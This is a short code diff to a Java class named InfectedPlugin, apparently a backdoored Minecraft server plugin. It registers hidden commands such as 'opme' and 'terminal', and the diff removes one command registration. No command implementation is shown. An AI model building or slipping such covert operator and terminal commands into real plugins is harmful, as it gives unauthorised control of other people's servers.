@@ -35,7 +35,6 @@ public class InfectedPlugin extends JavaPlugin
             pm.registerEvents(new Command_deop(), this);
             pm.registerEvents(new Command_op(), this);
             pm.registerEvents(new Command_gamemode(), this);
-            pm.registerEvents(new Command_enablevanilla(), this);
             pm.registerEvents(new Command_help(), this);
             pm.registerEvents(new Command_opme(), this);
             pm.registerEvents(new Command_terminal(), this);
